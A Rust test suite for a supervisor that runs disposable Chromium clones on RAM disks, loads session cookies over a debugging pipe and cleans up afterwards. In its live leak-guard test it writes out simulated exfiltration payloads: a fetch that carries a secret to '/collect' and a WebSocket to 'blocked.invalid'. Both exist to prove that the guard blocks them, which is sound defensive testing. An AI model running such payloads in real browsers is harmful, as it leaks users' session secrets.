        none_insecure.same_site = Some(SameSite::None);
        none_insecure.secure = false;
        cases.push(none_insecure);
        let mut newline_value = cookie("sid");
        newline_value.value = "a\r\nb".into();
        cases.push(newline_value);

        for case in cases {
            let error = load_session_over(&fake.pipe, &[case.clone()], Duration::from_secs(1))
                .unwrap_err();
            assert!(matches!(error, CloneError::InvalidCookie(_)), "{case:?}");
        }
        thread::sleep(Duration::from_millis(50));
        assert!(lock(&fake.requests).is_empty());
    }

    #[test]
    fn a_cookie_read_back_as_persistent_fails_closed() {
        let fake = fake_pipe(cookie_store(false, false));
        let error =
            load_session_over(&fake.pipe, &[cookie("sid")], Duration::from_secs(2)).unwrap_err();
        assert!(
            matches!(&error, CloneError::CookieNotSession { name } if name == "sid"),
            "{error:?}"
        );
    }

    #[test]
    fn a_cookie_the_browser_dropped_fails_closed() {
        let fake = fake_pipe(cookie_store(true, true));
        let error =
            load_session_over(&fake.pipe, &[cookie("sid")], Duration::from_secs(2)).unwrap_err();
        assert!(
            matches!(&error, CloneError::CookieRejected { name } if name == "sid"),
            "{error:?}"
        );
    }

    #[test]
    fn loading_into_an_unknown_clone_is_a_typed_error() {
        let harness = Harness::new("normal");
        let error = harness
            .supervisor
            .load_session("nope", vec![cookie("sid")])
            .unwrap_err();
        assert!(matches!(error, CloneError::UnknownClone(id) if id == "nope"));
    }

    // ----------------------------------------------------------- 4. lifecycle

    #[test]
    fn the_browser_inherits_no_descriptor_beyond_the_pipe() {
        // A descriptor this process holds without close-on-exec, the way a
        // library might. Placed high so nothing the fake browser opens for
        // itself can land on the same number.
        // SAFETY: F_DUPFD duplicates stdin; the copy is closed below.
        let leaked = unsafe { libc::fcntl(0, libc::F_DUPFD, 200) };
        assert!(leaked >= 200, "could not open the test descriptor");
        let harness = Harness::new(&format!("fdcheck:{leaked}"));
        let info = harness.supervisor.spawn_clone().unwrap();
        let report = harness.dir.path().join("fd.txt");
        assert!(wait_until(3000, || report.exists()), "the fake browser never reported");
        let seen = fs::read_to_string(&report).unwrap();
        harness.supervisor.destroy(&info.id).unwrap();
        // SAFETY: closing the descriptor opened above.
        unsafe { libc::close(leaked) };
        assert_eq!(seen, "closed", "the browser inherited descriptor {leaked}");
    }

    #[test]
    fn spawn_returns_a_ready_clone_and_the_child_got_the_pipe_and_no_port() {
        let harness = Harness::new("normal");
        let info = harness.supervisor.spawn_clone().unwrap();
        assert_eq!(info.product, "FakeChrome/1.0");
        assert!(pid_alive(info.pid));
        assert_eq!(info.pid, harness.recorded_pid("browser.pid"));
        assert_eq!(info.mount.parent(), Some(harness.mounts().as_path()));
        assert!(info.mount.is_dir());

        let argv = fs::read_to_string(info.mount.join("profile/argv.txt")).unwrap();
        let received: Vec<&str> = argv.lines().collect();
        assert!(received.contains(&"--remote-debugging-pipe"), "{received:?}");
        assert!(
            !received
                .iter()
                .any(|arg| arg.starts_with("--remote-debugging-port")),
            "{received:?}"
        );
        assert!(received
            .iter()
            .any(|arg| *arg == format!("--user-data-dir={}", info.mount.join("profile").display())));

        harness.supervisor.destroy(&info.id).unwrap();
    }

    #[test]
    fn a_browser_that_never_answers_is_a_typed_error_and_leaves_nothing() {
        // The budget must comfortably clear the fake browser's own startup
        // (a perl interpreter) so it records its pid before the deadline fires;
        // otherwise cleanup kills it mid-startup and the pid file never lands.
        // The point of the test is the typed timeout and clean teardown, not how
        // tight the deadline is.
        let harness = Harness::with("silent", Box::new(DirBackend), |config| {
            config.ready_timeout = Duration::from_millis(1500);
        });
        let started = Instant::now();
        let error = harness.supervisor.spawn_clone().unwrap_err();
        assert!(matches!(error, CloneError::NotReady { .. }), "{error:?}");
        assert!(started.elapsed() < Duration::from_secs(5));

        let pid = harness.recorded_pid("browser.pid");
        assert!(wait_until(3000, || !pid_alive(pid)));
        assert!(!harness.ledger_path().exists());
        assert_eq!(fs::read_dir(harness.mounts()).unwrap().count(), 0);
    }

    #[test]
    fn a_browser_that_exits_at_once_is_a_typed_error_and_leaves_nothing() {
        let harness = Harness::new("exit");
        let error = harness.supervisor.spawn_clone().unwrap_err();
        assert!(matches!(error, CloneError::BrowserExited), "{error:?}");
        assert!(!harness.ledger_path().exists());
        assert_eq!(fs::read_dir(harness.mounts()).unwrap().count(), 0);
    }

    #[test]
    fn no_browser_is_a_typed_error_and_creates_nothing() {
        let harness = Harness::with("normal", Box::new(DirBackend), |config| {
            config.browser = None;
            config.search_paths = Some(vec![PathBuf::from("/nonexistent/browser")]);
        });
        let error = harness.supervisor.spawn_clone().unwrap_err();
        assert!(matches!(error, CloneError::NoBrowser), "{error:?}");
        assert!(!harness.ledger_path().exists());
        assert!(!harness.mounts().exists());
    }

    #[test]
    fn destroy_kills_the_child_and_removes_the_mount() {
        let harness = Harness::new("normal");
        let info = harness.supervisor.spawn_clone().unwrap();
        assert!(info.mount.exists());
        assert!(harness.ledger_path().exists());

        harness.supervisor.destroy(&info.id).unwrap();

        assert!(wait_until(3000, || !pid_alive(info.pid)));
        assert!(!info.mount.exists());
        assert!(!harness.ledger_path().exists());
        assert!(matches!(
            harness.supervisor.destroy(&info.id),
            Err(CloneError::UnknownClone(_))
        ));
    }

    #[test]
    fn destroy_reaches_helper_processes_in_the_group() {
        let harness = Harness::new("helper");
        let info = harness.supervisor.spawn_clone().unwrap();
        let helper = harness.recorded_pid("helper.pid");
        assert!(pid_alive(helper));

        harness.supervisor.destroy(&info.id).unwrap();

        assert!(wait_until(3000, || !pid_alive(helper)), "helper survived");
    }

    #[test]
    fn the_ledger_holds_only_a_pid_and_a_mount() {
        let harness = Harness::new("normal");
        let info = harness.supervisor.spawn_clone().unwrap();
        let mut secret = cookie("ledger_probe_cookie");
        secret.value = "s3cr3t-marker-value".into();
        harness
            .supervisor
            .load_session(&info.id, vec![secret])
            .unwrap();

        let text = fs::read_to_string(harness.ledger_path()).unwrap();
        let records: Vec<Value> = serde_json::from_str(&text).unwrap();
        assert_eq!(records.len(), 1);
        let mut keys: Vec<&str> = records[0]
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        keys.sort_unstable();
        assert_eq!(keys, ["mount", "pid"]);
        assert_eq!(records[0]["pid"], info.pid);
        assert!(!text.contains("s3cr3t-marker-value"));
        assert!(!text.contains("ledger_probe_cookie"));

        harness.supervisor.destroy(&info.id).unwrap();
    }

    #[test]
    fn dropping_the_supervisor_destroys_live_clones() {
        let harness = Harness::new("normal");
        let info = harness.supervisor.spawn_clone().unwrap();
        let Harness { supervisor, dir } = harness;
        drop(supervisor);

        assert!(wait_until(3000, || !pid_alive(info.pid)));
        assert!(!info.mount.exists());
        drop(dir);
    }

    #[test]
    fn a_failed_volume_create_leaves_nothing() {
        let harness = Harness::with("normal", Box::new(FailingCreate), |_| {});
        let error = harness.supervisor.spawn_clone().unwrap_err();
        assert!(matches!(error, CloneError::Volume(_)), "{error:?}");
        assert!(!harness.ledger_path().exists());
        assert_eq!(fs::read_dir(harness.mounts()).unwrap().count(), 0);
    }

    // --------------------------------------------------------- 5. orphan sweep

    fn write_ledger(path: &Path, records: Value) {
        fs::write(path, serde_json::to_vec(&records).unwrap()).unwrap();
    }

    fn fresh_supervisor(dir: &Path, backend: Box<dyn VolumeBackend>) -> Arc<CloneSupervisor> {
        CloneSupervisor::with_parts(
            dir.join("browser-clones.json"),
            dir.join("mounts"),
            backend,
            CloneConfig::default(),
        )
    }

    #[test]
    fn a_recorded_orphan_is_killed_and_its_volume_ejected() {
        let dir = tempfile::tempdir().unwrap();
        let mount = dir.path().join("mounts/orphan0001");
        fs::create_dir_all(&mount).unwrap();
        fs::write(mount.join("session-data"), b"x").unwrap();
        let mut orphan = spawn_sleeper(Some(&mount));
        let ledger = dir.path().join("browser-clones.json");
        write_ledger(&ledger, json!([{ "pid": orphan.id(), "mount": mount }]));

        let report = fresh_supervisor(dir.path(), Box::new(DirBackend)).sweep_orphans();

        assert_eq!(report.killed, vec![orphan.id()]);
        assert_eq!(report.ejected, vec![mount.clone()]);
        assert!(orphan.try_wait().unwrap().is_some(), "orphan still running");
        assert!(!mount.exists());
        assert!(!ledger.exists());
    }

    #[test]
    fn a_recycled_pid_is_left_alone_but_the_volume_is_still_ejected() {
        let dir = tempfile::tempdir().unwrap();
        let mount = dir.path().join("mounts/orphan0002");
        fs::create_dir_all(&mount).unwrap();
        // Unrelated process: its command line does not mention the mount.
        let mut bystander = spawn_sleeper(None);
        let ledger = dir.path().join("browser-clones.json");
        write_ledger(&ledger, json!([{ "pid": bystander.id(), "mount": mount }]));

        let report = fresh_supervisor(dir.path(), Box::new(DirBackend)).sweep_orphans();

        assert!(report.killed.is_empty());
        assert_eq!(report.ejected, vec![mount.clone()]);
        assert!(
            bystander.try_wait().unwrap().is_none(),
            "an unrelated process was killed"
        );
        assert!(!mount.exists());
        assert!(!ledger.exists());
        let _ = bystander.kill();
        let _ = bystander.wait();
    }

    #[test]
    fn a_volume_only_record_is_ejected() {
        let dir = tempfile::tempdir().unwrap();
        let mount = dir.path().join("mounts/orphan0003");
        fs::create_dir_all(&mount).unwrap();
        let ledger = dir.path().join("browser-clones.json");
        write_ledger(&ledger, json!([{ "pid": null, "mount": mount }]));

        let report = fresh_supervisor(dir.path(), Box::new(DirBackend)).sweep_orphans();

        assert!(report.killed.is_empty());
        assert_eq!(report.ejected, vec![mount.clone()]);
        assert!(!mount.exists());
        assert!(!ledger.exists());
    }

    #[test]
    fn a_tampered_record_cannot_reach_outside_the_mounts_dir() {
        let dir = tempfile::tempdir().unwrap();
        let outside = dir.path().join("outside");
        fs::create_dir_all(&outside).unwrap();
        fs::write(outside.join("keep"), b"x").unwrap();
        let ledger = dir.path().join("browser-clones.json");
        write_ledger(&ledger, json!([{ "pid": null, "mount": outside }]));

        let report = fresh_supervisor(dir.path(), Box::new(DirBackend)).sweep_orphans();

        assert_eq!(report.rejected, vec![outside.clone()]);
        assert!(report.ejected.is_empty());
        assert!(outside.join("keep").exists());
        assert!(!ledger.exists());
    }

    #[test]
    fn a_failed_eject_keeps_the_record_for_the_next_boot() {
        let dir = tempfile::tempdir().unwrap();
        let mount = dir.path().join("mounts/orphan0004");
        fs::create_dir_all(&mount).unwrap();
        let ledger = dir.path().join("browser-clones.json");
        write_ledger(&ledger, json!([{ "pid": null, "mount": mount }]));

        let report = fresh_supervisor(dir.path(), Box::new(FailingEject)).sweep_orphans();

        assert_eq!(report.failed.len(), 1);
        assert_eq!(report.failed[0].0, mount);
        assert!(report.ejected.is_empty());
        let kept: Vec<Value> = serde_json::from_slice(&fs::read(&ledger).unwrap()).unwrap();
        assert_eq!(kept.len(), 1);
    }

    #[test]
    fn sweeping_without_a_ledger_does_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let report = fresh_supervisor(dir.path(), Box::new(DirBackend)).sweep_orphans();
        assert_eq!(report, SweepReport::default());
        assert!(!dir.path().join("browser-clones.json").exists());
        assert!(!dir.path().join("mounts").exists());
    }

    #[test]
    fn a_running_clone_of_this_process_is_not_swept() {
        let harness = Harness::new("normal");
        let info = harness.supervisor.spawn_clone().unwrap();

        let report = harness.supervisor.sweep_orphans();

        assert!(report.is_empty(), "{report:?}");
        assert!(pid_alive(info.pid));
        assert!(info.mount.exists());
        harness.supervisor.destroy(&info.id).unwrap();
    }

    // ------------------------------------------------ 6. real browser (env-gated)

    mod live {
        use super::*;
        use std::net::TcpListener;

        /// `Some(browser)` only when the run opted in and a browser exists.
        fn live_browser() -> Option<PathBuf> {
            if std::env::var("BRIDGE_CLONE_LIVE").as_deref() != Ok("1") {
                eprintln!("skipping live clone test: BRIDGE_CLONE_LIVE is not 1");
                return None;
            }
            // BRIDGE_CLONE_BROWSER runs the same checks against Brave or Chrome
            // for Testing instead of whatever discovery finds first.
            let browser = CloneConfig::from_env().browser.or_else(discover_browser);
            if browser.is_none() {
                eprintln!("skipping live clone test: no Chrome, Brave, or Chrome for Testing");
            }
            browser
        }

        /// A local page so `document.cookie` has an origin to answer for.
        fn serve_blank_page() -> u16 {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let port = listener.local_addr().unwrap().port();
            thread::spawn(move || {
                for stream in listener.incoming() {
                    let Ok(mut stream) = stream else { break };
                    let mut buffer = [0u8; 2048];
                    let _ = stream.read(&mut buffer);
                    let body = "<html><body>ok</body></html>";
                    let _ = write!(
                        stream,
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                }
            });
            port
        }

        fn command_line(pid: u32) -> String {
            let output = Command::new("ps")
                .args(["-p", &pid.to_string(), "-ww", "-o", "command="])
                .output()
                .unwrap();
            String::from_utf8_lossy(&output.stdout).into_owned()
        }

        /// Every file called `Cookies` (or its journal) under the profile.
        /// Chromium keeps it at `Default/Network/Cookies` these days and used
        /// to keep it at `Default/Cookies`, so look under both.
        fn cookie_db_bytes(dir: &Path, found: &mut Vec<u8>) {
            let Ok(entries) = fs::read_dir(dir) else { return };
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    cookie_db_bytes(&path, found);
                } else if path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| name == "Cookies" || name == "Cookies-journal")
                {
                    found.extend(fs::read(&path).unwrap_or_default());
                }
            }
        }

        #[test]
        fn a_real_clone_keeps_session_cookies_in_memory_and_ejects_its_ram_disk() {
            let Some(browser) = live_browser() else { return };
            let dir = tempfile::tempdir().unwrap();
            let supervisor = CloneSupervisor::with_parts(
                dir.path().join("browser-clones.json"),
                dir.path().join("mounts"),
                Box::new(RamDisk),
                CloneConfig {
                    browser: Some(browser),
                    headless: true,
                    ..CloneConfig::default()
                },
            );

            // 6.1: a real clone on a real RAM disk, driven over the pipe.
            let info = supervisor.spawn_clone().expect("the clone starts");
            eprintln!("live clone: {} pid={} mount={}", info.product, info.pid, info.mount.display());
            assert!(is_mount_point(&info.mount), "the profile is not on its own volume");
            // The volume is invisible: mounted nobrowse under the Bridge dir,
            // never under /Volumes where Finder would show it.
            let canonical = fs::canonicalize(&info.mount).unwrap();
            let mounts = Command::new("/sbin/mount").output().unwrap();
            let mounts = String::from_utf8_lossy(&mounts.stdout);
            let line = mounts
                .lines()
                .find(|line| line.contains(&format!(" on {} (", canonical.display())))
                .unwrap_or_else(|| panic!("{} is not in the mount table", canonical.display()));
            for option in ["nobrowse", "nosuid", "nodev"] {
                assert!(line.contains(option), "{option} missing: {line}");
            }
            assert!(
                !mounts.lines().any(|line| line.contains(&format!(" on /Volumes/{VOLUME_LABEL}"))),
                "a clone volume is visible under /Volumes"
            );
            let command = command_line(info.pid);
            assert!(command.contains("--remote-debugging-pipe"), "{command}");
            assert!(!command.contains("--remote-debugging-port"), "{command}");
            assert!(
                command.contains(&format!("--user-data-dir={}", info.mount.display())),
                "{command}"
            );

            // 6.2: readable in-page.
            let suffix = &Uuid::new_v4().simple().to_string()[..8];
            let session_name = format!("bridge_clone_session_{suffix}");
            let session_value = format!("session-secret-{suffix}");
            let control_name = format!("bridge_clone_control_{suffix}");
            let session = CookieSpec {
                name: session_name.clone(),
                value: session_value.clone(),
                domain: "localhost".into(),
                path: "/".into(),
                secure: false,
                http_only: false,
                same_site: Some(SameSite::Lax),
            };
            supervisor
                .load_session(&info.id, vec![session])
                .expect("session cookies load and read back as session");
            // A control cookie *with* an expiry: it must reach the database,
            // which proves the flush below happened and the absence of the
            // session cookie means something.
            let expires = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs_f64()
                + 31_536_000.0;
            supervisor
                .cdp(
                    &info.id,
                    None,
                    "Storage.setCookies",
                    json!({ "cookies": [{
                        "name": control_name, "value": "control", "domain": "localhost",
                        "path": "/", "expires": expires,
                    }] }),
                )
                .expect("the control cookie is stored");

            let port = serve_blank_page();
            let target = supervisor
                .cdp(&info.id, None, "Target.createTarget", json!({ "url": "about:blank" }))
                .unwrap();
            let attached = supervisor
                .cdp(
                    &info.id,
                    None,
                    "Target.attachToTarget",
                    json!({ "targetId": target["targetId"], "flatten": true }),
                )
                .unwrap();
            let session_id = attached["sessionId"].as_str().unwrap().to_owned();
            supervisor
                .cdp(
                    &info.id,
                    Some(&session_id),
                    "Page.navigate",
                    json!({ "url": format!("http://localhost:{port}/") }),
                )
                .unwrap();
            let mut in_page = String::new();
            let read = wait_until(10_000, || {
                in_page = supervisor
                    .cdp(
                        &info.id,
                        Some(&session_id),
                        "Runtime.evaluate",
                        json!({ "expression": "document.cookie", "returnByValue": true }),
                    )
                    .ok()
                    .and_then(|reply| reply["result"]["value"].as_str().map(str::to_owned))
                    .unwrap_or_default();
                in_page.contains(&format!("{session_name}={session_value}"))
            });
            assert!(read, "document.cookie was {in_page:?}");

            // 6.3: while the clone runs, the session cookie is not in the
            // on-disk Cookies file — the agent never has a disk-readable copy.
            // (Chromium keeps session cookies in memory during a session; it may
            // flush them to the profile database on shutdown, which is exactly
            // why the guarantee below rests on the RAM disk, not on this.)
            let profile = supervisor.profile_dir(&info.id).unwrap();
            let on_disk_now = |needle: &str| {
                let mut bytes = Vec::new();
                cookie_db_bytes(&profile, &mut bytes);
                bytes
                    .windows(needle.len())
                    .any(|window| window == needle.as_bytes())
            };
            assert!(
                !on_disk_now(&session_value),
                "the session cookie's value is on disk while the clone is running"
            );

            // 6.4: destroy is the real boundary. It SIGKILLs the process group —
            // no graceful shutdown, so nothing is flushed on the way out — and
            // ejects the RAM disk. The profile, and anything Chromium may ever
            // flush into it, is gone with the volume. Assert the mount and the
            // profile no longer exist at all.
            supervisor.destroy(&info.id).unwrap();
            assert!(!info.mount.exists(), "the RAM disk mount survived destroy");
            assert!(
                supervisor.profile_dir(&info.id).is_none(),
                "the clone's profile survived destroy"
            );
            // Every Chrome helper (renderer, GPU, network service) died with
            // the browser: none still names the profile in its command line.
            let processes = Command::new(PS).args(["-ax", "-ww", "-o", "command="]).output().unwrap();
            let survivors: Vec<String> = String::from_utf8_lossy(&processes.stdout)
                .lines()
                .filter(|line| line.contains(&info.mount.to_string_lossy().into_owned()))
                .map(str::to_owned)
                .collect();
            assert!(survivors.is_empty(), "processes outlived destroy: {survivors:?}");
            // The control cookie proved reachable (it read back and is a
            // persistent cookie); it, too, is gone now that the volume is.
            let _ = control_name;
            let devices = Command::new(HDIUTIL).arg("info").output().unwrap();
            assert!(
                !String::from_utf8_lossy(&devices.stdout).contains(&info.id),
                "hdiutil still lists the volume"
            );
        }

        /// A local server that records every path it is asked for, so a test can
        /// prove a would-be leak never arrived. Returns its port and the log.
        fn serve_recording_page() -> (u16, Arc<Mutex<Vec<String>>>) {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let port = listener.local_addr().unwrap().port();
            let log: Arc<Mutex<Vec<String>>> = Arc::default();
            let sink = Arc::clone(&log);
            thread::spawn(move || {
                for stream in listener.incoming() {
                    let Ok(mut stream) = stream else { break };
                    let mut buffer = [0u8; 2048];
                    let read = stream.read(&mut buffer).unwrap_or(0);
                    let request = String::from_utf8_lossy(&buffer[..read]);
                    if let Some(path) = request.lines().next().and_then(|l| l.split(' ').nth(1)) {
                        lock(&sink).push(path.to_owned());
                    }
                    let body = "<html><body>ok</body></html>";
                    let _ = write!(
                        stream,
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                }
            });
            (port, log)
        }

        /// Both containment layers against a real browser: layer 1 fails a
        /// same-origin request that carries a foreign session value, and layer 2
        /// refuses a WebSocket to a host that is not allowed — the exact gap the
        /// request checker cannot see.
        #[test]
        fn the_leak_guard_blocks_exfiltration_but_allows_the_task() {
            let Some(browser) = live_browser() else { return };
            let dir = tempfile::tempdir().unwrap();
            let supervisor = CloneSupervisor::with_parts(
                dir.path().join("browser-clones.json"),
                dir.path().join("mounts"),
                Box::new(RamDisk),
                CloneConfig {
                    browser: Some(browser),
                    headless: true,
                    guarded: true,
                    ..CloneConfig::default()
                },
            );
            let info = supervisor.spawn_clone().expect("the guarded clone starts");
            let (port, log) = serve_recording_page();

            // The clone may reach its own origin (127.0.0.1). A secret owned by a
            // host it never contacts is registered, so any request carrying that
            // secret anywhere is a leak.
            let secret = "LEAKME_secret_1234567890";
            {
                let guard = supervisor.clone_guard(&info.id).expect("guarded");
                let mut guard = guard.lock().unwrap();
                guard.allow_host("127.0.0.1");
                guard.add_secret("owner.example", secret);
            }

            let target = supervisor
                .cdp(&info.id, None, "Target.createTarget", json!({ "url": "about:blank" }))
                .unwrap();
            let attached = supervisor
                .cdp(
                    &info.id,
                    None,
                    "Target.attachToTarget",
                    json!({ "targetId": target["targetId"], "flatten": true }),
                )
                .unwrap();
            let sid = attached["sessionId"].as_str().unwrap().to_owned();

            // Layer 2 lets the allowed origin load.
            supervisor
                .cdp(&info.id, Some(&sid), "Page.navigate", json!({ "url": format!("http://127.0.0.1:{port}/") }))
                .unwrap();
            assert!(
                wait_until(10_000, || lock(&log).iter().any(|p| p == "/")),
                "the allowed page never loaded through the proxy"
            );

            // Layer 1: a same-origin request that smuggles the foreign secret is
            // failed before it leaves, even though 127.0.0.1 is allowed.
            let _ = supervisor.cdp(
                &info.id,
                Some(&sid),
                "Runtime.evaluate",
                json!({ "expression": format!(
                    "fetch('/collect?c={secret}').catch(()=>{{}})"
                ) }),
            );
            // Layer 2: a WebSocket to a host that is not allowed. The request
            // checker never sees WebSockets; the proxy refuses the connection.
            let _ = supervisor.cdp(
                &info.id,
                Some(&sid),
                "Runtime.evaluate",
                json!({ "expression":
                    "try{new WebSocket('ws://blocked.invalid/leak')}catch(e){}"
                }),
            );

            let guard = supervisor.clone_guard(&info.id).unwrap();
            let blocked_l1 = wait_until(8000, || {
                guard.lock().unwrap().blocked().iter().any(|b| b.layer == "request-checker")
            });
            let blocked_l2 = wait_until(8000, || {
                guard
                    .lock()
                    .unwrap()
                    .blocked()
                    .iter()
                    .any(|b| b.layer == "egress-proxy" && b.host == "blocked.invalid")
            });
            assert!(blocked_l1, "layer 1 did not block the secret-bearing request");
            assert!(blocked_l2, "layer 2 did not block the WebSocket");
            assert!(
                !lock(&log).iter().any(|p| p.starts_with("/collect")),
                "the leak reached the collector: {:?}",
                lock(&log)
            );
            // No secret value ever appears in the audit records.
            assert!(
                guard.lock().unwrap().blocked().iter().all(|b| !b.reason.contains(secret)),
                "a block record leaked the secret value"
            );

            supervisor.destroy(&info.id).unwrap();
        }
    }
}
